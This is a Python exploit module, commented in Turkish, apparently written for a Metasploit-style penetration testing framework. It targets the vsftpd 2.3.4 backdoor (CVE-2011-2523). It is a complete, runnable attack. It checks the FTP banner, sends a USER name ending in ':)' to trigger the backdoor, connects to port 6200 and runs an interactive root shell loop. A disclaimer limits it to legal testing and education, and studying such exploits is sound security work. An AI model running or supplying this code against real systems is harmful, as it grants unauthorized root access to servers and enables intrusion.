# =============================================================================
# vsftpd 2.3.4 Backdoor Exploit Modülü
# =============================================================================
# CVE-2011-2523: vsftpd 2.3.4 sürümünde bulunan arka kapı zafiyeti
#
# AÇIKLAMA:
#   2011 yılında vsftpd 2.3.4'ün kaynak koduna kötü niyetli bir arka kapı 
#   eklendi. Kullanıcı adı ":)" ile bittiğinde, sunucu 6200 portunda bir 
#   root shell açar.
#
# TEKNİK DETAYLAR:
#   - Zafiyet Türü: Backdoor (Arka Kapı)
#   - Etkilenen Sürüm: vsftpd 2.3.4
#   - Yayın Tarihi: Temmuz 2011
#   - CVSS Skoru: 10.0 (Kritik)
#   - Exploit Yöntemi: FTP USER komutu ile ":)" içeren kullanıcı adı gönderme
#   - Sonuç: Port 6200'de root yetkisinde shell erişimi
#
# KULLANIM:
#   1. use exploit/ftp/vsftpd_234_backdoor
#   2. set RHOST <hedef_ip>
#   3. set RPORT 21  (varsayılan)
#   4. run
#
# REFERANSLAR:
#   - https://nvd.nist.gov/vuln/detail/CVE-2011-2523
#   - https://www.exploit-db.com/exploits/17491
#   - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
#
# DİKKAT: Bu modül sadece yasal penetrasyon testleri ve eğitim amaçlıdır.
#         Yetkisiz sistemlere erişim suçtur!
# =============================================================================

import socket
import time
from typing import Dict, Any, Optional

from core.module import BaseModule
from core.option import Option
from core import logger
from rich import print


class vsftpd_234_backdoor(BaseModule):
    """vsftpd 2.3.4 Backdoor Exploit Modülü
    
    Bu modül, vsftpd 2.3.4 sürümündeki arka kapı zafiyetini (CVE-2011-2523)
    kullanarak hedef sistemde root yetkisinde shell erişimi sağlar.
    
    Zafiyet Mekanizması:
        1. FTP sunucusuna bağlan (varsayılan port 21)
        2. USER komutu ile ":)" içeren kullanıcı adı gönder
        3. PASS komutu ile herhangi bir parola gönder
        4. Arka kapı tetiklenir ve port 6200 açılır
        5. Port 6200'e bağlanarak root shell al
    
    Attributes:
        Name: Modül adı (arama ve listeleme için)
        Description: Modül açıklaması
        Author: Geliştirici bilgisi
        Category: Modül kategorisi
        Options: Kullanıcı tarafından ayarlanabilir seçenekler
    """
    
    # =========================================================================
    # MODÜL META BİLGİLERİ
    # =========================================================================
    Name = "vsftpd 2.3.4 Backdoor"
    Description = "CVE-2011-2523 - vsftpd 2.3.4 sürümündeki arka kapı zafiyetini kullanarak root shell erişimi sağlar."
    Author = "Mahmut P."
    Category = "exploit"
    
    # =========================================================================
    # SABİTLER
    # =========================================================================
    BACKDOOR_PORT = 6200           # Arka kapının açıldığı port
    TRIGGER_USER = "mahmut:)"         # Arka kapıyı tetikleyen kullanıcı adı (":)" ile biten herhangi bir isim çalışır)
    TRIGGER_PASS = "pass"          # Herhangi bir parola (önemli değil)
    DEFAULT_TIMEOUT = 10           # Bağlantı zaman aşımı (saniye)
    SHELL_RECV_SIZE = 4096         # Shell'den okunacak maksimum byte
    
    def __init__(self):
        """Modül başlatıcı - Options tanımlaması
        
        Options:
            RHOST: Hedef sistemin IP adresi veya hostname'i
            RPORT: FTP servisinin çalıştığı port (varsayılan: 21)
            TIMEOUT: Bağlantı zaman aşımı süresi (saniye)
        """
        super().__init__()
        
        # Kullanıcı tarafından ayarlanabilir seçenekler
        self.Options = {
            "RHOST": Option(
                name="RHOST",
                value=None,
                required=True,
                description="Hedef sistemin IP adresi veya hostname'i"
            ),
            "RPORT": Option(
                name="RPORT",
                value=21,
                required=True,
                description="FTP servisinin portu (varsayılan: 21)",
                regex_check=True,
                regex=r"^\d{1,5}$"  # 1-5 haneli sayı
            ),
            "TIMEOUT": Option(
                name="TIMEOUT",
                value=10,
                required=False,
                description="Bağlantı zaman aşımı süresi (saniye)",
                regex_check=True,
                regex=r"^\d+$"
            ),
        }
        
        # Options'ları instance attribute olarak da ekle
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)
    
    # =========================================================================
    # YARDIMCI METODLAR
    # =========================================================================
    
    def _create_socket(self, timeout: int) -> socket.socket:
        """Yapılandırılmış bir TCP socket oluşturur.
        
        Args:
            timeout: Bağlantı zaman aşımı süresi (saniye)
            
        Returns:
            Yapılandırılmış socket objesi
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        return sock
    
    def _connect_ftp(self, host: str, port: int, timeout: int) -> Optional[socket.socket]:
        """FTP sunucusuna bağlantı kurar ve banner'ı okur.
        
        Args:
            host: Hedef IP adresi
            port: FTP port numarası
            timeout: Zaman aşımı süresi
            
        Returns:
            Başarılı ise socket objesi, değilse None
        """
        try:
            sock = self._create_socket(timeout)
            
            print(f"[*] Hedefe bağlanılıyor: {host}:{port}")
            logger.info(f"FTP bağlantısı başlatılıyor: {host}:{port}")
            
            sock.connect((host, port))
            
            # FTP banner'ını oku
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[*] FTP Banner: {banner.strip()}")
            logger.debug(f"FTP banner alındı: {banner.strip()}")
            
            # vsftpd 2.3.4 olup olmadığını kontrol et
            if "2.3.4" in banner:
                print("[+] [bold green]Hedef vsftpd 2.3.4 çalıştırıyor - Zafiyet mevcut![/bold green]")
                logger.info("Hedef vsftpd 2.3.4 tespit edildi")
            else:
                print("[!] [bold yellow]Uyarı: Hedef vsftpd 2.3.4 olmayabilir[/bold yellow]")
                logger.warning(f"Hedef vsftpd 2.3.4 olmayabilir: {banner.strip()}")
            
            return sock
            
        except socket.timeout:
            print(f"[!] [bold red]Bağlantı zaman aşımına uğradı: {host}:{port}[/bold red]")
            logger.error(f"FTP bağlantı zaman aşımı: {host}:{port}")
            return None
            
        except socket.error as e:
            print(f"[!] [bold red]Bağlantı hatası: {e}[/bold red]")
            logger.error(f"FTP bağlantı hatası: {e}")
            return None
    
    def _trigger_backdoor(self, sock: socket.socket) -> bool:
        """Arka kapıyı tetiklemek için özel USER/PASS komutları gönderir.
        
        FTP protokolüne göre:
        1. USER <kullanıcı_adı> gönder -> 331 yanıtı al
        2. PASS <parola> gönder -> Arka kapı tetiklenir
        
        Args:
            sock: Aktif FTP bağlantısı
            
        Returns:
            Tetikleme başarılı ise True
        """
        try:
            # USER komutu gönder (arka kapıyı tetikleyen özel kullanıcı adı)
            user_cmd = f"USER {self.TRIGGER_USER}\r\n"
            print(f"[*] USER komutu gönderiliyor: {self.TRIGGER_USER}")
            logger.debug(f"USER komutu gönderildi: {self.TRIGGER_USER}")
            
            sock.send(user_cmd.encode('utf-8'))
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[*] Yanıt: {response.strip()}")
            
            # PASS komutu gönder
            pass_cmd = f"PASS {self.TRIGGER_PASS}\r\n"
            print(f"[*] PASS komutu gönderiliyor...")
            logger.debug("PASS komutu gönderildi")
            
            sock.send(pass_cmd.encode('utf-8'))
            
            # Kısa bir bekleme (arka kapının açılması için)
            time.sleep(1)
            
            print("[+] Arka kapı tetikleme komutları gönderildi")
            logger.info("Backdoor tetikleme komutları başarıyla gönderildi")
            return True
            
        except socket.error as e:
            print(f"[!] [bold red]Tetikleme sırasında hata: {e}[/bold red]")
            logger.error(f"Backdoor tetikleme hatası: {e}")
            return False
    
    def _connect_backdoor(self, host: str, timeout: int) -> Optional[socket.socket]:
        """Arka kapı portuna (6200) bağlantı kurar.
        
        Args:
            host: Hedef IP adresi
            timeout: Bağlantı zaman aşımı
            
        Returns:
            Başarılı ise shell socket'i, değilse None
        """
        try:
            print(f"[*] Arka kapı portuna bağlanılıyor: {host}:{self.BACKDOOR_PORT}")
            logger.info(f"Backdoor portuna bağlanılıyor: {host}:{self.BACKDOOR_PORT}")
            
            shell_sock = self._create_socket(timeout)
            shell_sock.connect((host, self.BACKDOOR_PORT))
            
            print("[+] [bold green]Arka kapı bağlantısı başarılı![/bold green]")
            logger.info("Backdoor bağlantısı kuruldu")
            
            return shell_sock
            
        except socket.timeout:
            print(f"[!] [bold red]Arka kapı portu yanıt vermiyor (Exploit başarısız olabilir)[/bold red]")
            logger.error("Backdoor portu zaman aşımı - exploit başarısız")
            return None
            
        except ConnectionRefusedError:
            print(f"[!] [bold red]Arka kapı portu kapalı - Hedef zafiyetli olmayabilir[/bold red]")
            logger.error("Backdoor portu kapalı - hedef zafiyetli değil")
            return None
            
        except socket.error as e:
            print(f"[!] [bold red]Arka kapı bağlantı hatası: {e}[/bold red]")
            logger.error(f"Backdoor bağlantı hatası: {e}")
            return None
    
    def _interactive_shell(self, shell_sock: socket.socket) -> None:
        """Kullanıcıyla etkileşimli shell oturumu başlatır.
        
        Basit bir shell döngüsü:
        1. Kullanıcıdan komut al
        2. Komutu hedefe gönder
        3. Yanıtı ekrana yazdır
        4. 'exit' yazılana kadar devam et
        
        Args:
            shell_sock: Aktif backdoor socket bağlantısı
        """
        print("\n" + "=" * 60)
        print("[bold green]ROOT SHELL AÇILDI![/bold green]")
        print("Komut girmek için yazın. Çıkmak için 'exit' yazın.")
        print("=" * 60 + "\n")
        
        logger.info("Etkileşimli shell oturumu başlatıldı")
        
        # İlk çıktıyı oku (varsa)
        try:
            shell_sock.setblocking(False)
            initial_output = shell_sock.recv(self.SHELL_RECV_SIZE).decode('utf-8', errors='ignore')
            if initial_output:
                print(initial_output, end='')
        except BlockingIOError:
            pass  # Henüz veri yok, normal
        finally:
            shell_sock.setblocking(True)
            shell_sock.settimeout(5)
        
        # Etkileşimli döngü
        while True:
            try:
                # Kullanıcıdan komut al
                cmd = input("shell> ")
                
                # Çıkış kontrolü
                if cmd.lower() in ['exit', 'quit', 'q']:
                    print("[*] Shell oturumu kapatılıyor...")
                    logger.info("Shell oturumu kullanıcı tarafından kapatıldı")
                    break
                
                # Boş komut kontrolü
                if not cmd.strip():
                    continue
                
                # Komutu gönder
                shell_sock.send((cmd + "\n").encode('utf-8'))
                
                # Yanıtı oku
                time.sleep(0.5)  # Yanıt için kısa bekleme
                try:
                    output = shell_sock.recv(self.SHELL_RECV_SIZE).decode('utf-8', errors='ignore')
                    if output:
                        print(output, end='')
                except socket.timeout:
                    pass  # Zaman aşımı, yanıt yok
                    
            except KeyboardInterrupt:
                print("\n[*] Ctrl+C algılandı, shell kapatılıyor...")
                logger.info("Shell oturumu Ctrl+C ile kapatıldı")
                break
                
            except socket.error as e:
                print(f"\n[!] [bold red]Bağlantı koptu: {e}[/bold red]")
                logger.error(f"Shell bağlantısı koptu: {e}")
                break
    
    # =========================================================================
    # ANA ÇALIŞTIRMA METODU
    # =========================================================================
    
    def run(self, options: Dict[str, Any]) -> bool:
        """Exploit'i çalıştırır.
        
        Çalışma Akışı:
            1. Parametreleri doğrula
            2. FTP sunucusuna bağlan
            3. Arka kapıyı tetikle
            4. Arka kapı portuna bağlan
            5. Etkileşimli shell başlat
        
        Args:
            options: Kullanıcı tarafından ayarlanan seçenekler
                - RHOST: Hedef IP
                - RPORT: FTP portu
                - TIMEOUT: Zaman aşımı
        
        Returns:
            Exploit başarılı ise True, değilse False
        """
        # =====================================================================
        # 1. PARAMETRE DOĞRULAMA
        # =====================================================================
        rhost = options.get("RHOST")
        rport = int(options.get("RPORT", 21))
        timeout = int(options.get("TIMEOUT", self.DEFAULT_TIMEOUT))
        
        if not rhost:
            print("[!] [bold red]RHOST parametresi zorunludur![/bold red]")
            logger.error("Exploit başarısız: RHOST belirtilmedi")
            return False
        
        print("\n" + "=" * 60)
        print(f"[*] [bold cyan]{self.Name}[/bold cyan]")
        print(f"[*] Hedef: {rhost}:{rport}")
        print(f"[*] Timeout: {timeout} saniye")
        print("=" * 60 + "\n")
        
        logger.info(f"Exploit başlatıldı: {rhost}:{rport}")
        
        ftp_sock = None
        shell_sock = None
        
        try:
            # =================================================================
            # 2. FTP BAĞLANTISI
            # =================================================================
            ftp_sock = self._connect_ftp(rhost, rport, timeout)
            if not ftp_sock:
                return False
            
            # =================================================================
            # 3. ARKA KAPIYI TETİKLE
            # =================================================================
            if not self._trigger_backdoor(ftp_sock):
                return False
            
            # FTP bağlantısını kapat (artık gerekli değil)
            ftp_sock.close()
            ftp_sock = None
            
            # =================================================================
            # 4. ARKA KAPI PORTUNA BAĞLAN
            # =================================================================
            shell_sock = self._connect_backdoor(rhost, timeout)
            if not shell_sock:
                return False
            
            # =================================================================
            # 5. ETKİLEŞİMLİ SHELL
            # =================================================================
            self._interactive_shell(shell_sock)
            
            print(f"\n[+] [bold green]{self.Name} başarıyla tamamlandı.[/bold green]")
            logger.info("Exploit başarıyla tamamlandı")
            return True
            
        except Exception as e:
            print(f"[!] [bold red]Beklenmeyen hata: {e}[/bold red]")
            logger.exception(f"Exploit sırasında beklenmeyen hata")
            return False
            
        finally:
            # Bağlantıları temizle
            if ftp_sock:
                try:
                    ftp_sock.close()
                except:
                    pass
            if shell_sock:
                try:
                    shell_sock.close()
                except:
                    pass
